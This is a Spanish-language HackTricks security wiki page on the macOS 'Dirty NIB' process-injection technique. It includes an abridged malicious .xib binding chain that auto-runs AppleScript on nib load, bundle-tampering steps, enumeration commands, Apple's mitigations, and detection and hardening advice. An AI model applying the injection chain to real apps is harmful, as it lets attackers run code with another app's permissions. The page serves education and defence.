# macOS Dirty NIB

{{#include ../../../banners/hacktricks-training.md}}

Dirty NIB se refiere al abuso de archivos de Interface Builder (.xib/.nib) dentro de un bundle de app firmado de macOS para ejecutar lógica controlada por el atacante dentro del proceso objetivo, heredando así sus entitlements y permisos TCC. Esta técnica fue documentada originalmente por xpn (MDSec) y más tarde generalizada y ampliada significativamente por Sector7, quienes también trataron las mitigaciones de Apple en macOS 13 Ventura y macOS 14 Sonoma. Para contexto y análisis detallados, ver las referencias al final.

> TL;DR
> • Before macOS 13 Ventura: reemplazar el MainMenu.nib de un bundle (u otro nib cargado al inicio) podía lograr de forma fiable inyección en el proceso y con frecuencia escalada de privilegios.
> • Since macOS 13 (Ventura) and improved in macOS 14 (Sonoma): la verificación profunda en el primer lanzamiento, la protección del bundle, Launch Constraints y el nuevo permiso TCC “App Management” impiden en gran medida la manipulación post‑lanzamiento de nibs por apps no relacionadas. Los ataques pueden seguir siendo factibles en casos nicho (por ejemplo, tooling del mismo desarrollador que modifica sus propias apps, o terminales a los que el usuario ha concedido App Management/Full Disk Access).

## ¿Qué son los archivos NIB/XIB

Los archivos Nib (abreviatura de NeXT Interface Builder) son gráficos de objetos de UI serializados usados por apps AppKit. Xcode moderno almacena archivos .xib editables en XML que se compilan en .nib en tiempo de build. Una app típica carga su UI principal vía `NSApplicationMain()` que lee la clave `NSMainNibFile` desde el Info.plist de la app e instancia el gráfico de objetos en tiempo de ejecución.

Puntos clave que habilitan el ataque:
- Cargar NIB instancia clases Objective‑C arbitrarias sin requerir que cumplan con NSSecureCoding (el nib loader de Apple recurre a `init`/`initWithFrame:` cuando `initWithCoder:` no está disponible).
- Cocoa Bindings puede ser abusado para llamar métodos mientras se instancian los nibs, incluyendo llamadas encadenadas que no requieren interacción del usuario.

## Proceso de inyección Dirty NIB (vista del atacante)

El flujo clásico pre‑Ventura:
1) Create a malicious .xib
- Add an `NSAppleScript` object (or other “gadget” classes such as `NSTask`).
- Add an `NSTextField` whose title contains the payload (e.g., AppleScript or command arguments).
- Add one or more `NSMenuItem` objects wired via bindings to call methods on the target object.

2) Auto‑trigger without user clicks
- Use bindings to set a menu item’s target/selector and then invoke the private `_corePerformAction` method so the action fires automatically when the nib loads. This removes the need for a user to click a button.

Minimal example of an auto‑trigger chain inside a .xib (abridged for clarity):
```xml
<objects>
<customObject id="A1" customClass="NSAppleScript"/>
<textField id="A2" title="display dialog \"PWND\""/>
<!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
<menuItem id="C1">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="initWithSource:"/>
<binding name="Argument" destination="A2" keyPath="title"/>
</connections>
</menuItem>
<!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
<menuItem id="C2">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="executeAndReturnError:"/>
</connections>
</menuItem>
<!-- Triggers that auto‑press the above menu items at load time -->
<menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
<menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
Esto logra la ejecución arbitraria de AppleScript en el proceso objetivo al cargar el nib. Cadenas avanzadas pueden:
- Instanciar clases arbitrarias de AppKit (p. ej., `NSTask`) y llamar a métodos sin argumentos como `-launch`.
- Llamar selectores arbitrarios con argumentos objeto mediante el truco de binding anterior.
- Cargar AppleScriptObjC.framework para enlazar con Objective‑C e incluso llamar APIs C seleccionadas.
- En sistemas más antiguos que todavía incluyen Python.framework, enlazar a Python y luego usar `ctypes` para llamar a funciones C arbitrarias (investigación de Sector7).

3) Replace the app’s nib
- Copiar target.app a una ubicación escribible, reemplazar p. ej., `Contents/Resources/MainMenu.nib` con el nib malicioso, y ejecutar target.app. Pre‑Ventura, tras una evaluación única de Gatekeeper, los lanzamientos posteriores solo realizaban comprobaciones superficiales de firma, por lo que recursos no ejecutables (como .nib) no se volvieron a validar.

Ejemplo de payload de AppleScript para una prueba visible:
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```
## Protecciones modernas de macOS (Ventura/Monterey/Sonoma/Sequoia)

Apple introdujo varias mitigaciones sistémicas que reducen drásticamente la viabilidad de Dirty NIB en macOS moderno:
- Verificación profunda al primer lanzamiento y protección de bundle (macOS 13 Ventura)
- En la primera ejecución de cualquier app (quarantined o no), una comprobación profunda de firma cubre todos los recursos del bundle. Después, el bundle queda protegido: solo apps del mismo desarrollador (o explícitamente permitidas por la app) pueden modificar su contenido. Otras apps requieren el nuevo permiso TCC “App Management” para escribir en el bundle de otra app.
- Launch Constraints (macOS 13 Ventura)
- System/Apple‑bundled apps can’t be copied elsewhere and launched; this kills the “copy to /tmp, patch, run” approach for OS apps.
- Mejoras en macOS 14 Sonoma
- Apple endureció App Management y solucionó bypasses conocidos (p. ej., CVE‑2023‑40450) señalados por Sector7. Python.framework se eliminó antes (macOS 12.3), rompiendo algunas cadenas de privilege‑escalation.
- Cambios en Gatekeeper/Quarantine
- Para una discusión más amplia sobre Gatekeeper, la procedencia y los cambios en la evaluación que impactaron esta técnica, vea la página referenciada abajo.

> Implicación práctica
> • En Ventura+ generalmente no se puede modificar el .nib de una app de terceros a menos que tu proceso tenga App Management o esté firmado por el mismo Team ID que el objetivo (p. ej., herramientas de desarrollo).
> • Conceder App Management o Full Disk Access a shells/terminales reabre efectivamente esta superficie de ataque para cualquier cosa que pueda ejecutar código en el contexto de ese terminal.

### Abordando Launch Constraints

Launch Constraints impiden ejecutar muchas apps de Apple desde ubicaciones no predeterminadas a partir de Ventura. Si dependías de flujos previos a Ventura como copiar una app de Apple a un directorio temporal, modificar `MainMenu.nib` y lanzarla, espera que eso falle en >= 13.0.


## Enumerando objetivos y nibs (útil para investigación / sistemas legacy)

- Localiza apps cuya UI está basada en nib‑driven:
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- Buscar recursos nib candidatos dentro de un bundle:
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- Validar profundamente las firmas de código (fallará si alteraste los recursos y no las volviste a firmar):
```bash
codesign --verify --deep --strict --verbose=4 target.app
```
> Nota: En macOS moderno también serás bloqueado por bundle protection/TCC cuando intentes escribir en el bundle de otra app sin la autorización adecuada.


## Detección y consejos DFIR

- Monitoreo de integridad de archivos en recursos del bundle
- Vigila cambios de mtime/ctime en `Contents/Resources/*.nib` y otros recursos no ejecutables en apps instaladas.
- Registros unificados y comportamiento de procesos
- Monitorea la ejecución inesperada de AppleScript dentro de apps GUI y procesos que carguen AppleScriptObjC o Python.framework. Ejemplo:
```bash
log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
```
- Evaluaciones proactivas
- Ejecuta periódicamente `codesign --verify --deep` en apps críticas para asegurarte de que los recursos permanezcan intactos.
- Contexto de privilegios
- Audita quién/qué tiene TCC “App Management” o Full Disk Access (especialmente terminales y agentes de gestión). Eliminar estos permisos de shells de propósito general evita re‑habilitaciones triviales de manipulación estilo Dirty NIB.


## Endurecimiento defensivo (desarrolladores y defensores)

- Prefiere UI programática o limita lo que se instancia desde nibs. Evita incluir clases potentes (p. ej., `NSTask`) en grafos de nib y evita bindings que invoquen selectores indirectamente en objetos arbitrarios.
- Adopta el hardened runtime con Library Validation (ya estándar en apps modernas). Aunque esto no detiene por sí solo la inyección via nib, bloquea la carga fácil de código nativo y fuerza a los atacantes a payloads solo de scripting.
- No solicites ni dependas de permisos amplios de App Management en herramientas de propósito general. Si MDM requiere App Management, segrega ese contexto de los shells dirigidos por el usuario.
- Verifica regularmente la integridad del bundle de tu app y haz que tus mecanismos de actualización auto‑restauren los recursos del bundle.


## Lectura relacionada en HackTricks

Aprende más sobre Gatekeeper, quarantine y provenance y los cambios que afectan esta técnica:

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## Referencias

- xpn – DirtyNIB (original write‑up with Pages example): https://blog.xpnsec.com/dirtynib/
- Sector7 – Bringing process injection into view(s): exploiting all macOS apps using nib files (April 5, 2024): https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/

{{#include ../../../banners/hacktricks-training.md}}
